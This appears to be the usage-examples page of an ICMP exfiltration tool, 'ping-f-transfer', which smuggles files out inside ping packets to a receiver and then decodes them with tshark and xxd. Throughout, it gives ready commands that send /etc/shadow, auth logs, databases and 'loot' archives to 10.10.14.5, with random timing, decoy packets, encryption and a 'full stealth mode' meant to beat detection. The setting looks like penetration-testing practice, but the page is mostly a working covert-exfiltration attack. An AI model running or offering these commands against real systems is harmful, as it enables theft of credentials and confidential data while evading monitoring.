# `transfer` — Examples

The `transfer` subcommand sends a file directly from the current machine using `ping`. The tool must be installed (or run with `python3`) on the **sender** machine.

> **Reminder:** Start `tshark` on the **receiver** before running these commands.
>
> ```bash
> sudo tshark -i <interface> -l -Y 'icmp.type==8 && ip.src==<sender-ip>' -T fields -e data.data > capture.hex
> ```

---

## Basic transfer

```bash
# Send a file as fast as possible (no delay between pings)
ping-f-transfer transfer -f '/tmp/secret.txt' -i 10.10.14.5
```

**Decode on receiver:**

```bash
LC_ALL=C sort -u capture.hex | cut -c7- | xxd -r -p > secret.txt
sha256sum secret.txt
```

---

## With a fixed delay between pings

```bash
# 0.5 seconds between each ping
ping-f-transfer transfer -f '/home/user/database.sql' -i 10.10.14.5 -p 0.5
```

---

## With random delay (harder to detect by timing analysis)

```bash
# Each gap is 1.0 ± 0.4 seconds (between 0.6s and 1.4s)
ping-f-transfer transfer -f '/opt/backup.tar.gz' -i 10.10.14.5 -p 1.0 -r 0.4
```

---

## With compression

Reduces the number of packets for compressible files (text, SQL, logs, etc.).

```bash
ping-f-transfer transfer -f '/var/log/auth.log' -i 10.10.14.5 --compress
```

**Decode on receiver:**

```bash
LC_ALL=C sort -u capture.hex | cut -c7- | xxd -r -p | gunzip > auth.log
```

---

## With encryption

Encrypts the file before sending. The default cipher is `aes-256-cbc`.

```bash
# With an inline passphrase
ping-f-transfer transfer -f '/etc/shadow' -i 10.10.14.5 --encrypt --enc-passphrase 'MyS3cretP@ss'

# With a randomly generated passphrase (printed to stdout)
ping-f-transfer transfer -f '/etc/shadow' -i 10.10.14.5 --encrypt --random-passphrase 24

# With interactive passphrase prompt
ping-f-transfer transfer -f '/etc/shadow' -i 10.10.14.5 --encrypt

# Using AES-128 instead of the default AES-256
ping-f-transfer transfer -f '/etc/shadow' -i 10.10.14.5 --encrypt aes-128 --enc-passphrase 'short'
```

**Decode on receiver:**

```bash
LC_ALL=C sort -u capture.hex | cut -c7- | xxd -r -p | openssl enc -d -aes-256-cbc -pbkdf2 -iter 10000 -md sha256 -pass pass:'MyS3cretP@ss' > shadow
```

---

## With compression + encryption

```bash
ping-f-transfer transfer -f '/home/user/data.db' -i 10.10.14.5 --compress --encrypt --enc-passphrase 'hunter2'
```

**Decode on receiver (decrypt first, then decompress):**

```bash
LC_ALL=C sort -u capture.hex | cut -c7- | xxd -r -p | openssl enc -d -aes-256-cbc -pbkdf2 -iter 10000 -md sha256 -pass pass:'hunter2' | gunzip > data.db
```

---

## With junk packets

Injects decoy packets after each real one to obscure the transfer.

```bash
# 3 junk packets after every real packet
ping-f-transfer transfer -f '/tmp/loot.zip' -i 10.10.14.5 --junk 3
```

**Decode on receiver (filter junk first):**

```bash
LC_ALL=C sort -u capture.hex | grep -v '^ffffff' | cut -c7- | xxd -r -p > loot.zip
```

---

## With randomized junk packets

Makes junk packets harder to distinguish by pattern.

```bash
ping-f-transfer transfer -f '/tmp/loot.zip' -i 10.10.14.5 --junk 5 --randomize-junk
```

**Decode on receiver:**

```bash
LC_ALL=C sort -u capture.hex | grep -v '^ff' | cut -c7- | xxd -r -p > loot.zip
```

---

## Full stealth mode

Combining delay, junk, compression, and encryption:

```bash
ping-f-transfer transfer -f '/home/user/confidential.pdf' -i 10.10.14.5 \
  -p 0.8 -r 0.3 \
  --junk 4 --randomize-junk \
  --compress --encrypt --random-passphrase 32
```

**Decode on receiver:**

```bash
LC_ALL=C sort -u capture.hex | grep -v '^ff' | cut -c7- | xxd -r -p | openssl enc -d -aes-256-cbc -pbkdf2 -iter 10000 -md sha256 -pass pass:'<GENERATED_PASSPHRASE>' | gunzip > confidential.pdf
```

---

## Estimate transfer time (dry run)

Preview how long the transfer would take without sending any packets:

```bash
# Estimate with 0.2s delay and 3 junk packets
ping-f-transfer transfer -f '/var/log/syslog' -i 10.10.14.5 -p 0.2 --junk 3 --estimate-transfer-time

# Estimate with compression (shows compressed size)
ping-f-transfer transfer -f '/var/log/syslog' -i 10.10.14.5 -p 0.5 --compress --estimate-transfer-time
```

---

## Suppress the banner

```bash
ping-f-transfer transfer -f '/tmp/data.bin' -i 10.10.14.5 --no-banner
```

---

## Custom filenames in decode instructions

The tool prints tshark/decode instructions after the transfer. Customize the filenames shown:

```bash
ping-f-transfer transfer -f '/tmp/data.bin' -i 10.10.14.5 \
  --capture-packets-filename packets.hex \
  --decoded-filename recovered_data.bin
```

---

## All flags combined

Using every available flag in a single command:

```bash
ping-f-transfer transfer -f '/home/user/confidential.pdf' -i 10.10.14.5 \
  -p 0.01 -r 0.003 \
  --junk 2 --randomize-junk \
  --compress \
  --encrypt aes-128 --random-passphrase 32 \
  --capture-packets-filename capture_all.hex \
  --decoded-filename recovered.pdf \
  --no-banner
```

**Decode on receiver:**

```bash
LC_ALL=C sort -u capture_all.hex | grep -v '^ff' | cut -c7- | xxd -r -p | openssl enc -d -aes-128-cbc -pbkdf2 -iter 10000 -md sha256 -pass pass:'<GENERATED_PASSPHRASE>' | gunzip > recovered.pdf
```
